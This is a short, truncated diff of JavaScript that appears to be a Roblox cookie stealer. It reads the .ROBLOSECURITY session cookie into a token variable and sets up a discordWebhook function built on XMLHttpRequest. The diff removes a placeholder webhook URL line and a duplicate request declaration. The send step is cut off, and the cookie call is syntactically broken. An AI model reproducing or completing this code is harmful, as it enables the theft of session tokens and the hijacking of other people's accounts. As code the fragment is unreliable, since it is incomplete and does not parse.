@@ -3,9 +3,7 @@ function getCookie(name) {
   const parts = value.split(`; ${name}=`);
   if (parts.length === 2) return parts.pop().split(';').shift();
 }
-var webhook = "Your-Webhook-url";
 var token = getCookie(.ROBLOSECURITY)
-var request = new XMLHttpRequest();
 function discordWebhook(){
         const request = new XMLHttpRequest();
      
